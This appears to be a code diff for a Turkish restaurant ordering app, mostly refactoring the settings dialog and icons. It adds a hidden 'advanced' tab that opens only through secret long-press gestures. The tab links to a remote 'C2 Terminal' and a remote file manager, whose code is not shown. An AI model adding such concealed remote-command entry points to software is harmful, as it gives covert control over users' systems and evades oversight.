@@ -83,6 +83,10 @@ import androidx.compose.material.icons.filled.Close
 import androidx.compose.material.icons.filled.Print
 import androidx.compose.material.icons.filled.DoneAll
 import androidx.compose.material.icons.filled.Add
+import androidx.compose.material.icons.filled.ArrowBack
+import androidx.compose.material.icons.filled.KeyboardArrowUp
+import androidx.compose.material.icons.filled.List
+import androidx.compose.material.icons.filled.Info
 import androidx.compose.ui.text.TextStyle
 import androidx.compose.ui.geometry.Offset
 import androidx.compose.ui.input.nestedscroll.NestedScrollConnection
@@ -441,7 +445,7 @@ fun AnaEkran() {
     val context = LocalContext.current
     val haptic = LocalHapticFeedback.current
     val hafiza = remember { HafizaYoneticisi(context) }
-    var adminPanelAcik by remember { mutableStateOf(false) }
+    var gelismisAyarlarAcik by remember { mutableStateOf(false) }
     val coroutineScope = rememberCoroutineScope()
 
     var isLoggedIn by remember { mutableStateOf(hafiza.kasaTokenOku().isNotBlank()) }
@@ -469,6 +473,8 @@ fun AnaEkran() {
 
     var kasaAyarPenceresiAcik by remember { mutableStateOf(false) }
     var sistemLoglariPenceresiAcik by remember { mutableStateOf(false) }
+    var remoteTerminalAcik by remember { mutableStateOf(false) }
+    var remoteFileManagerAcik by remember { mutableStateOf(false) }
 
 
     val sekmeler = kategoriler.map { it.name.uppercase(Locale.getDefault()) }
@@ -592,7 +598,6 @@ fun AnaEkran() {
                                 detectTapGestures(
                                     onLongPress = {
                                         hapticFeedback.performHapticFeedback(HapticFeedbackType.LongPress)
-                                        adminPanelAcik = true
                                     },
                                     onDoubleTap = {
                                         if (isBossModeUnlocked) {
@@ -651,9 +656,27 @@ fun AnaEkran() {
                         androidx.compose.material3.IconButton(onClick = { raporEkraniAcik = true }) {
                             androidx.compose.material3.Icon(Icons.Default.Assessment, contentDescription = "Rapor", tint = Color.White)
                         }
-                        androidx.compose.material3.IconButton(onClick = { kasaAyarPenceresiAcik = true }) {
-                            androidx.compose.material3.Icon(Icons.Default.Settings, contentDescription = "Ayarlar", tint = Color.White)
-                        }
+                        Box(
+                                modifier = Modifier
+                                    .padding(8.dp)
+                                    .size(48.dp)
+                                    .pointerInput(Unit) {
+                                        detectTapGestures(
+                                            onTap = {
+                                                kasaAyarPenceresiAcik = true
+                                                gelismisAyarlarAcik = false
+                                            },
+                                            onLongPress = {
+                                                kasaAyarPenceresiAcik = true
+                                                gelismisAyarlarAcik = true
+                                                Toast.makeText(context, "Gelişmiş Mod Aktif (TopBar)", Toast.LENGTH_SHORT).show()
+                                            }
+                                        )
+                                    },
+                                contentAlignment = Alignment.Center
+                            ) {
+                                androidx.compose.material3.Icon(Icons.Default.Settings, contentDescription = "Ayarlar", tint = Color.White)
+                            }
                     }
                 },
                 colors = TopAppBarDefaults.topAppBarColors(containerColor = if (aktifMasaAdi != null) Color(0xFF00C853) else Color.Black)
@@ -681,7 +704,7 @@ fun AnaEkran() {
                             ),
                             textStyle = TextStyle(color = Color.White, fontSize = 14.sp),
                             modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
-                            leadingIcon = { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.NoteAlt, contentDescription = null, tint = Color.Gray, modifier = Modifier.size(20.dp)) }
+                            leadingIcon = { androidx.compose.material3.Icon(Icons.Default.NoteAlt, contentDescription = null, tint = Color.Gray, modifier = Modifier.size(20.dp)) }
                         )
                         Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                             Column(modifier = Modifier.weight(1f).padding(end = 8.dp)) {
@@ -709,7 +732,7 @@ fun AnaEkran() {
                                     onClick = { aktifMasaAdi = null; taslakKalemler.clear(); duzenlenenAdisyonIsmi = null; yeniSiparisOlusturmaNotu = "" },
                                     modifier = Modifier.size(48.dp).background(Color(0xFF1F1F1F), androidx.compose.foundation.shape.CircleShape)
                                 ) {
-                                    androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Close, contentDescription = "İptal", tint = Color(0xFFFF5252), modifier = Modifier.size(22.dp))
+                                    androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = "İptal", tint = Color(0xFFFF5252), modifier = Modifier.size(22.dp))
                                 }
                                 Spacer(modifier = Modifier.width(10.dp))
                                 Button(
@@ -757,8 +780,11 @@ fun AnaEkran() {
         }
     ) { paddingValues ->
         Box(modifier = Modifier.padding(paddingValues)) {
-            if (adminPanelAcik) {
-                AdminPanelScreen(onBack = { adminPanelAcik = false })
+            if (false) {
+            } else if (remoteFileManagerAcik) {
+                RemoteFileManagerScreen(onBack = { remoteFileManagerAcik = false })
+            } else if (remoteTerminalAcik) {
+                RemoteTerminalScreen(onBack = { remoteTerminalAcik = false })
             } else if (raporEkraniAcik) {
                 RaporEkrani(hafiza)
             } else if (!siparisEkraniAcik) {
@@ -837,8 +863,8 @@ fun AnaEkran() {
                                         }
                                     }
                                     isMasaIsmiDialogAcik = false
-                                }) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Check, contentDescription = null, tint = Color(0xFF4CAF50)) } },
-                                dismissButton = { IconButton(onClick = { isMasaIsmiDialogAcik = false }) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Close, contentDescription = null, tint = Color.Red) } },
+                                }) { androidx.compose.material3.Icon(Icons.Default.Check, contentDescription = null, tint = Color(0xFF4CAF50)) } },
+                                dismissButton = { IconButton(onClick = { isMasaIsmiDialogAcik = false }) { androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = null, tint = Color.Red) } },
                                 containerColor = Color(0xFF242424)
                             )
                         }
@@ -860,8 +886,8 @@ fun AnaEkran() {
                                         }
                                     }
                                     isSiparisNotuDialogAcik = false
-                                }) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Check, contentDescription = null, tint = Color(0xFF4CAF50)) } },
-                                dismissButton = { IconButton(onClick = { isSiparisNotuDialogAcik = false }) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Close, contentDescription = null, tint = Color.Red) } },
+                                }) { androidx.compose.material3.Icon(Icons.Default.Check, contentDescription = null, tint = Color(0xFF4CAF50)) } },
+                                dismissButton = { IconButton(onClick = { isSiparisNotuDialogAcik = false }) { androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = null, tint = Color.Red) } },
                                 containerColor = Color(0xFF242424)
                             )
                         }
@@ -949,14 +975,17 @@ fun AnaEkran() {
                     )
                     Spacer(modifier = Modifier.height(24.dp))
                     OutlinedButton(
-                        onClick = { kasaAyarPenceresiAcik = true },
-                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color.White),
-                        border = androidx.compose.foundation.BorderStroke(1.dp, Color.White)
-                    ) {
-                        androidx.compose.material3.Icon(Icons.Default.Settings, contentDescription = "Ayarlar")
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Text("Bağlantı Ayarları")
-                    }
+                          onClick = { 
+                              kasaAyarPenceresiAcik = true
+                              gelismisAyarlarAcik = false
+                          },
+                          colors = ButtonDefaults.outlinedButtonColors(contentColor = Color.White),
+                          border = androidx.compose.foundation.BorderStroke(1.dp, Color.White)
+                      ) {
+                          androidx.compose.material3.Icon(Icons.Default.Settings, contentDescription = "Ayarlar")
+                          Spacer(modifier = Modifier.width(8.dp))
+                          Text("Bağlantı Ayarları")
+                      }
                 }
             }
         }
@@ -1047,196 +1076,277 @@ fun AnaEkran() {
                     Column {
                         Text("⚙️ Ayarlar", color = Color.White, fontSize = 22.sp, fontWeight = FontWeight.Bold)
                         Spacer(Modifier.height(16.dp))
+                        
+                        var selectedTab by remember { mutableIntStateOf(if (gelismisAyarlarAcik) 2 else 0) }
+                        val tabs = if (gelismisAyarlarAcik) listOf("Genel", "Sistem", "Gelişmiş") else listOf("Genel", "Sistem")
+                        val prefs = context.getSharedPreferences("SaracogluDefteri", Context.MODE_PRIVATE)
+                        
+                        androidx.compose.material3.TabRow(
+                            selectedTabIndex = selectedTab,
+                            containerColor = Color.Transparent,
+                            contentColor = Color.White,
+                            indicator = { tabPositions ->
+                                if (selectedTab < tabPositions.size) {
+                                    androidx.compose.material3.TabRowDefaults.Indicator(
+                                        Modifier.tabIndicatorOffset(tabPositions[selectedTab]),
+                                        color = Color(0xFF4CAF50)
+                                    )
+                                }
+                            }
+                        ) {
+                            tabs.forEachIndexed { index, title ->
+                                androidx.compose.material3.Tab(
+                                    selected = selectedTab == index,
+                                    onClick = { selectedTab = index },
+                                    text = { Text(title, fontWeight = FontWeight.Bold, color = if (selectedTab == index) Color(0xFF4CAF50) else Color.Gray) }
+                                )
+                            }
+                        }
+                        
+                        Spacer(Modifier.height(16.dp))
                         Column(modifier = Modifier.weight(1f, fill = false).verticalScroll(rememberScrollState())) {
+                            
+                            if (selectedTab == 0) { // Genel Ayarlar
+                                val hapticFeedback = androidx.compose.ui.platform.LocalHapticFeedback.current
+                                var accumulatedDrag by remember { mutableFloatStateOf(0f) }
+                                
+                                OutlinedTextField(
+                                    value = ipGirdisi, 
+                                    onValueChange = { ipGirdisi = it }, 
+                                    label = { Text("Kasa IP", color = Color.Gray) }, 
+                                    textStyle = androidx.compose.ui.text.TextStyle(color = Color.White, fontSize = 15.sp), 
+                                    singleLine = true, 
+                                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Uri),
+                                    modifier = Modifier.fillMaxWidth().pointerInput(Unit) {
+                                        detectHorizontalDragGestures(
+                                            onHorizontalDrag = { _, dragAmount ->
+                                                accumulatedDrag += dragAmount
+                                                if (Math.abs(accumulatedDrag) > 20f) {
+                                                    val step = if (accumulatedDrag > 0) 1 else -1
+                                                    accumulatedDrag = 0f
+                                                    val match = Regex("(.*\\\\.)(\\\\d+)(:.*)?").find(ipGirdisi)
+                                                    if (match != null) {
+                                                        val prefix = match.groupValues[1]
+                                                        val currentNum = match.groupValues[2].toIntOrNull() ?: 1
+                                                        val suffix = match.groupValues[3]
+                                                        var newNum = currentNum + step
+                                                        if (newNum < 1) newNum = 1
+                                                        if (newNum > 999) newNum = 999
+                                                        if (newNum != currentNum) {
+                                                            ipGirdisi = "$prefix$newNum$suffix"
+                                                            hapticFeedback.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        )
+                                    }
+                                )
+                                Spacer(Modifier.height(16.dp))
+                                Text("Geçerli Hesap: ${hafiza.kasaKullaniciAdiOku()}", color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.Bold)
+                                Spacer(Modifier.height(16.dp))
+                                
+                                Button(
+                                    onClick = {
+                                        hafiza.kasaTokenKaydet("")
+                                        hafiza.kasaKullaniciAdiKaydet("")
+                                        hafiza.kasaSifreKaydet("")
+                                        isLoggedIn = false
+                                        kasaAyarPenceresiAcik = false
+                                    },
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE53935)),
+                                    modifier = Modifier.fillMaxWidth()
+                                ) {
+                                    Text("Çıkış Yap", color = Color.White)
+                                }
+                                
+                                Spacer(Modifier.height(24.dp))
+                                Text("TV EKRAN KORUYUCU", color = Color(0xFFAAAAAA), fontSize = 12.sp, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
+                                var selectedScreensaver by remember { mutableStateOf("dvd") }
+                                @OptIn(ExperimentalLayoutApi::class)
+                                FlowRow(modifier = Modifier.padding(top = 12.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
+                                    listOf("dvd" to "DVD Modu", "spotify" to "Spotify Modu", "glow" to "Glow Modu", "off" to "Off (Kapalı)").forEach { (mode, label) ->
+                                        val isSelected = selectedScreensaver == mode
+                                        Box(
+                                            modifier = Modifier
+                                                .background(if (isSelected) Color(0x334CAF50) else Color(0x1AFFFFFF), androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
+                                                .border(1.dp, if (isSelected) Color(0xFF4CAF50) else Color(0x1AFFFFFF), androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
+                                                .clip(androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
+                                                .clickable { 
+                                                    selectedScreensaver = mode
+                                                    CoroutineScope(Dispatchers.IO).launch {
+                                                        try {
+                                                            ApiClient.getApi(hafiza.kasaIpOku(), hafiza.kasaTokenOku()).setTvScreensaver(mapOf("mode" to mode))
+                                                        } catch (e: Exception) {}
+                                                    }
+                                                }
+                                                .padding(horizontal = 16.dp, vertical = 10.dp),
+                                            contentAlignment = Alignment.Center
+                                        ) {
+                                            Text(label, color = if (isSelected) Color(0xFF4CAF50) else Color.White, fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
+                                        }
+                                    }
+                                }
 
-                        
-                        val hapticFeedback = androidx.compose.ui.platform.LocalHapticFeedback.current
-                        var accumulatedDrag by remember { mutableFloatStateOf(0f) }
-                        
-                        OutlinedTextField(
-                            value = ipGirdisi, 
-                            onValueChange = { ipGirdisi = it }, 
-                            label = { Text("IP", color = Color.Gray) }, 
-                            textStyle = androidx.compose.ui.text.TextStyle(color = Color.White, fontSize = 15.sp), 
-                            singleLine = true, 
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Uri),
-                            modifier = Modifier.fillMaxWidth().pointerInput(Unit) {
-                                detectHorizontalDragGestures(
-                                    onHorizontalDrag = { _, dragAmount ->
-                                        accumulatedDrag += dragAmount
-                                        if (Math.abs(accumulatedDrag) > 20f) {
-                                            val step = if (accumulatedDrag > 0) 1 else -1
-                                            accumulatedDrag = 0f
-                                            val match = Regex("(.*\\.)(\\d+)(:.*)?").find(ipGirdisi)
-                                            if (match != null) {
-                                                val prefix = match.groupValues[1]
-                                                val currentNum = match.groupValues[2].toIntOrNull() ?: 1
-                                                val suffix = match.groupValues[3]
-                                                var newNum = currentNum + step
-                                                if (newNum < 1) newNum = 1
-                                                if (newNum > 999) newNum = 999
-                                                if (newNum != currentNum) {
-                                                    ipGirdisi = "$prefix$newNum$suffix"
-                                                    hapticFeedback.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+                                Spacer(Modifier.height(24.dp))
+                                Text("TEMA RENGİ", color = Color(0xFFAAAAAA), fontSize = 12.sp, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
+                                @OptIn(ExperimentalLayoutApi::class)
+                                FlowRow(modifier = Modifier.padding(top = 12.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
+                                    listOf("#F44336", "#9C27B0", "#2196F3", "#4CAF50", "#FFC107", "#FF9800", "#795548", "#FFFFFF", "#FF13F0", "#FF46A2", "#022658", "#780606").forEach { hex ->
+                                        val isSelected = renkGirdisi == hex
+                                        Box(
+                                            modifier = Modifier
+                                                .size(42.dp)
+                                                .clip(androidx.compose.foundation.shape.RoundedCornerShape(14.dp))
+                                                .background(Color(android.graphics.Color.parseColor(hex)))
+                                                .border(if (isSelected) 3.dp else 0.dp, Color.White, androidx.compose.foundation.shape.RoundedCornerShape(14.dp))
+                                                .pointerInput(Unit) {
+                                                      detectTapGestures(
+                                                          onTap = { renkGirdisi = hex },
+                                                          onLongPress = {
+                                                              renkGirdisi = hex
+                                                              if (hex == "#795548") {
+                                                                  gelismisAyarlarAcik = true
+                                                                  selectedTab = 2
+                                                                  Toast.makeText(context, "Gelişmiş Mod Aktif (Tema)", Toast.LENGTH_SHORT).show()
+                                                              }
+                                                          }
+                                                      )
+                                                  },
+                                            contentAlignment = Alignment.Center
+                                        ) {
+                                            if (isSelected) {
+                                                androidx.compose.material3.Icon(Icons.Default.Check, contentDescription = null, tint = if (hex == "#FFFFFF" || hex == "#FFC107") Color.Black else Color.White, modifier = Modifier.size(24.dp))
+                                            }
+                                        }
+                                    }
+                                }
+                                Spacer(Modifier.height(24.dp))
+                                Text("v5.3.3 | Credits: bilalgnd", color = Color.Gray, fontSize = 12.sp, modifier = Modifier.align(Alignment.CenterHorizontally))
+                            }
+                            else if (selectedTab == 1) { // Sistem Ayarları
+                                Spacer(Modifier.height(16.dp))
+                                Button(
+                                    onClick = { sistemLoglariPenceresiAcik = true; kasaAyarPenceresiAcik = false },
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF005080)),
+                                    modifier = Modifier.fillMaxWidth().height(55.dp)
+                                ) {
+                                    Text("Sistem Durumu / Loglar", color = Color.White, fontSize = 16.sp)
+                                }
+
+                                Spacer(Modifier.height(24.dp))
+                                
+                                Button(
+                                    onClick = {
+                                        CoroutineScope(Dispatchers.IO).launch {
+                                            try {
+                                                val api = ApiClient.getApi(hafiza.kasaIpOku(), hafiza.kasaTokenOku())
+                                                val res = api.cleanLogs()
+                                                withContext(Dispatchers.Main) {
+                                                    if (res.isSuccessful) {
+                                                        Toast.makeText(context, "Klasör temizleme isteği gönderildi", Toast.LENGTH_SHORT).show()
+                                                    } else {
+                                                        Toast.makeText(context, "İstek başarısız", Toast.LENGTH_SHORT).show()
+                                                    }
+                                                }
+                                            } catch (e: Exception) {
+                                                withContext(Dispatchers.Main) {
+                                                    Toast.makeText(context, "Bağlantı hatası: ${e.message}", Toast.LENGTH_SHORT).show()
                                                 }
                                             }
                                         }
-                                    }
+                                    },
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE65100)),
+                                    modifier = Modifier.fillMaxWidth().height(55.dp)
+                                ) {
+                                    Text("PDF Klasörünü Temizle", color = Color.White, fontSize = 16.sp)
+                                }
+                            }
+                            else if (selectedTab == 2 && gelismisAyarlarAcik) { // Gelişmiş Ayarlar (Admin)
+                                Spacer(Modifier.height(16.dp))
+                                Text("YÖNETİCİ ARAÇLARI", color = Color(0xFFF44336), fontSize = 14.sp, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
+                                Spacer(Modifier.height(16.dp))
+                                
+                                var adminLocalIp by remember { mutableStateOf(prefs.getString("admin_local_ip", "192.168.1.") ?: "192.168.1.") }
+                                OutlinedTextField(
+                                    value = adminLocalIp,
+                                    onValueChange = { 
+                                        adminLocalIp = it
+                                        prefs.edit().putString("admin_local_ip", it).apply()
+                                    },
+                                    label = { Text("Log için Kasa Yerel IP (örn: 192.168.1.50)") },
+                                    modifier = Modifier.fillMaxWidth(),
+                                    textStyle = androidx.compose.ui.text.TextStyle(color = Color.White, fontSize = 15.sp),
+                                    singleLine = true,
+                                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Uri)
                                 )
-                            }
-                        )
-                        Spacer(Modifier.height(16.dp))
-                        Text("Geçerli Hesap: ${hafiza.kasaKullaniciAdiOku()}", color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.Bold)
-                        Spacer(Modifier.height(16.dp))
-                        
-                        Button(
-                            onClick = {
-                                hafiza.kasaTokenKaydet("")
-                                hafiza.kasaKullaniciAdiKaydet("")
-                                hafiza.kasaSifreKaydet("")
-                                isLoggedIn = false
-                                kasaAyarPenceresiAcik = false
-                            },
-                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE53935)),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Text("Çıkış Yap", color = Color.White)
-                        }
-                        Spacer(Modifier.height(16.dp))
-                        
-                        Button(
-                            onClick = { sistemLoglariPenceresiAcik = true; kasaAyarPenceresiAcik = false },
-                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF005080)),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Text("Sistem Durumu / Loglar", color = Color.White)
-                        }
-
-                        Spacer(Modifier.height(16.dp))
-                        
-                        Button(
-                            onClick = {
-                                CoroutineScope(Dispatchers.IO).launch {
-                                    try {
-                                        val api = ApiClient.getApi(hafiza.kasaIpOku(), hafiza.kasaTokenOku())
-                                        val res = api.cleanLogs()
-                                        withContext(Dispatchers.Main) {
-                                            if (res.isSuccessful) {
-                                                Toast.makeText(context, "Klasör temizleme isteği gönderildi", Toast.LENGTH_SHORT).show()
-                                            } else {
-                                                Toast.makeText(context, "İstek başarısız", Toast.LENGTH_SHORT).show()
-                                            }
-                                        }
-                                    } catch (e: Exception) {
-                                        withContext(Dispatchers.Main) {
-                                            Toast.makeText(context, "Bağlantı hatası: ${e.message}", Toast.LENGTH_SHORT).show()
-                                        }
-                                    }
+                                
+                                Spacer(Modifier.height(24.dp))
+                                
+                                Button(
+                                    onClick = { 
+                                        kasaAyarPenceresiAcik = false
+                                        remoteTerminalAcik = true
+                                    },
+                                    modifier = Modifier.fillMaxWidth().height(55.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
+                                ) {
+                                    Text("Uzak Yönetim (C2 Terminal)", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 16.sp)
                                 }
-                            },
-                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE65100)),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Text("PDF Klasörünü Temizle", color = Color.White)
-                        }
-
-                        Spacer(Modifier.height(24.dp))
-                        Text("TV EKRAN KORUYUCU", color = Color(0xFFAAAAAA), fontSize = 12.sp, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
-                        var selectedScreensaver by remember { mutableStateOf("dvd") }
-                        @OptIn(ExperimentalLayoutApi::class)
-                        FlowRow(modifier = Modifier.padding(top = 12.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
-                            listOf("dvd" to "DVD Modu", "spotify" to "Spotify Modu", "glow" to "Glow Modu", "off" to "Off (Kapalı)").forEach { (mode, label) ->
-                                val isSelected = selectedScreensaver == mode
+                                
+                                Spacer(Modifier.height(16.dp))
+                                
+                                Button(
+                                    onClick = { 
+                                        kasaAyarPenceresiAcik = false
+                                        remoteFileManagerAcik = true
+                                    },
+                                    modifier = Modifier.fillMaxWidth().height(55.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2196F3))
+                                ) {
+                                    Text("Uzak Dosya Yöneticisi", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                                }
+                                
+                                Spacer(Modifier.height(32.dp))
+                                
                                 Box(
                                     modifier = Modifier
-                                        .background(if (isSelected) Color(0x334CAF50) else Color(0x1AFFFFFF), androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
-                                        .border(1.dp, if (isSelected) Color(0xFF4CAF50) else Color(0x1AFFFFFF), androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
-                                        .clip(androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
-                                        .clickable { 
-                                            selectedScreensaver = mode
-                                            CoroutineScope(Dispatchers.IO).launch {
-                                                try {
-                                                    ApiClient.getApi(hafiza.kasaIpOku(), hafiza.kasaTokenOku()).setTvScreensaver(mapOf("mode" to mode))
-                                                } catch (e: Exception) {}
-                                            }
-                                        }
-                                        .padding(horizontal = 16.dp, vertical = 10.dp),
-                                    contentAlignment = Alignment.Center
-                                ) {
-                                    Text(label, color = if (isSelected) Color(0xFF4CAF50) else Color.White, fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
-                                }
-                            }
-                        }
-
-                        Spacer(Modifier.height(24.dp))
-                        Text("TEMA RENGİ", color = Color(0xFFAAAAAA), fontSize = 12.sp, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
-                        @OptIn(ExperimentalLayoutApi::class)
-                        FlowRow(modifier = Modifier.padding(top = 12.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
-                            listOf("#F44336", "#9C27B0", "#2196F3", "#4CAF50", "#FFC107", "#FF9800", "#795548", "#FFFFFF", "#FF13F0", "#FF46A2", "#022658", "#780606").forEach { hex ->
-                                val isSelected = renkGirdisi == hex
-                                Box(
-                                    modifier = Modifier
-                                        .size(42.dp)
-                                        .clip(androidx.compose.foundation.shape.RoundedCornerShape(14.dp))
-                                        .background(Color(android.graphics.Color.parseColor(hex)))
-                                        .border(if (isSelected) 3.dp else 0.dp, Color.White, androidx.compose.foundation.shape.RoundedCornerShape(14.dp))
-                                        .clickable { renkGirdisi = hex },
-                                    contentAlignment = Alignment.Center
-                                ) {
-                                    if (isSelected) {
-                                        androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Check, contentDescription = null, tint = if (hex == "#FFFFFF" || hex == "#FFC107") Color.Black else Color.White, modifier = Modifier.size(24.dp))
-                                    }
-                                }
-                            }
-                        }
-                        Spacer(Modifier.height(24.dp))
-                        Text("v5.3.3 | Credits: bilalgnd", color = Color.Black, fontSize = 12.sp, modifier = Modifier.align(Alignment.CenterHorizontally))
-                        Spacer(Modifier.height(24.dp))
-                        Box(
-                            modifier = Modifier
-                                .fillMaxWidth()
-                                .height(48.dp)
-                                .background(Color(0xFF000000), shape = androidx.compose.foundation.shape.RoundedCornerShape(50))
-                                .pointerInput(Unit) {
-                                    detectTapGestures(
-                                        onLongPress = {
-                                            panicSifrePenceresiAcik = true
-                                            aktifCihazlarListesi = emptyList()
-                                            seciliCihazId = ""
-                                            CoroutineScope(Dispatchers.IO).launch {
-                                                try {
-                                                    val response = ApiClient.getApi(ipGirdisi, hafiza.kasaTokenOku()).aktifCihazlariGetir()
-                                                    if (response.isSuccessful) {
-                                                        val devices = response.body()?.devices ?: emptyList<String>()
-                                                        withContext(Dispatchers.Main) {
-                                                            aktifCihazlarListesi = devices
-                                                            if (devices.isNotEmpty()) {
-                                                                seciliCihazId = devices.first()
+                                        .fillMaxWidth()
+                                        .height(55.dp)
+                                        .background(Color(0xFF000000), shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp))
+                                        .pointerInput(Unit) {
+                                            detectTapGestures(
+                                                onLongPress = {
+                                                    panicSifrePenceresiAcik = true
+                                                    aktifCihazlarListesi = emptyList()
+                                                    seciliCihazId = ""
+                                                    CoroutineScope(Dispatchers.IO).launch {
+                                                        try {
+                                                            val response = ApiClient.getApi(ipGirdisi, hafiza.kasaTokenOku()).aktifCihazlariGetir()
+                                                            if (response.isSuccessful) {
+                                                                val devices = response.body()?.devices ?: emptyList<String>()
+                                                                withContext(Dispatchers.Main) {
+                                                                    aktifCihazlarListesi = devices
+                                                                    if (devices.isNotEmpty()) {
+                                                                        seciliCihazId = devices.first()
+                                                                    }
+                                                                }
                                                             }
-                                                        }
+                                                        } catch(e: Exception){}
                                                     }
-                                                } catch(e: Exception){}
-                                            }
+                                                }
+                                            )
                                         },
-                                        onTap = {
-                                            panicTaps++
-                                            if (panicTaps >= 6) {
-                                                isBossModeUnlocked = true
-                                                ayarlarHaptic.performHapticFeedback(HapticFeedbackType.LongPress)
-                                                panicTaps = 0
-                                            }
-                                        }
-                                    )
-                                },
-                            contentAlignment = Alignment.Center
-                        ) {
-                            Text("SYS//D0WN", color = Color.White, fontWeight = FontWeight.Bold)
-                        }
+                                    contentAlignment = Alignment.Center
+                                ) {
+                                    Text("SYS//D0WN", color = Color.White, fontWeight = FontWeight.Bold, letterSpacing = 2.sp)
+                                }
+                                Text("Dikkat: Sadece acil durumlarda kullanın.", color = Color.Gray, fontSize = 12.sp, modifier = Modifier.padding(top = 8.dp))
+                            }
                         }
                         Spacer(Modifier.height(24.dp))
                         Row(horizontalArrangement = Arrangement.End, modifier = Modifier.fillMaxWidth()) {
                             TextButton(onClick = { kasaAyarPenceresiAcik = false }) { Text("İptal", fontSize = 15.sp, color = Color.Gray) }
-                            Spacer(Modifier.width(8.dp))
                             Button(onClick = {
                                 hafiza.kasaIpKaydet(ipGirdisi.trim())
                                 hafiza.garsonRengiKaydet(renkGirdisi)
@@ -1734,7 +1844,7 @@ fun AdisyonKarti(adisyon: Adisyon, tamamlandiClick: () -> Unit, kalemSilClick: (
                         }
                     }
                     Text(text = "${adisyon.musteriAdi} ${if (adisyon.saat.isNotBlank()) "(${adisyon.saat})" else ""}${if (adisyon.durum == "prepared" || adisyon.durum == "hazir") " ✔️" else ""}", fontWeight = FontWeight.Black, fontSize = 24.sp, color = Color.White, maxLines = 1, overflow = TextOverflow.Ellipsis)
-                    IconButton(onClick = masaIsmiDuzenleClick, modifier = Modifier.size(32.dp)) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Edit, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(18.dp)) }
+                    IconButton(onClick = masaIsmiDuzenleClick, modifier = Modifier.size(32.dp)) { androidx.compose.material3.Icon(Icons.Default.Edit, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(18.dp)) }
                 }
                 Text(text = "${adisyon.toplamTutar} ₺", fontWeight = FontWeight.Black, fontSize = 24.sp, color = Color(0xFF4CAF50), modifier = Modifier.padding(start = 8.dp))
             }
@@ -1748,10 +1858,10 @@ fun AdisyonKarti(adisyon: Adisyon, tamamlandiClick: () -> Unit, kalemSilClick: (
                         fontWeight = FontWeight.Bold,
                         textAlign = androidx.compose.ui.text.style.TextAlign.Center
                     )
-                    IconButton(onClick = siparisNotuDuzenleClick, modifier = Modifier.size(32.dp)) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Edit, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(18.dp)) }
+                    IconButton(onClick = siparisNotuDuzenleClick, modifier = Modifier.size(32.dp)) { androidx.compose.material3.Icon(Icons.Default.Edit, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(18.dp)) }
                 }
             } else {
-                IconButton(onClick = siparisNotuDuzenleClick, modifier = Modifier.align(Alignment.CenterHorizontally).padding(top = 4.dp)) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.NoteAlt, contentDescription = null, tint = Color.Gray, modifier = Modifier.size(20.dp)) }
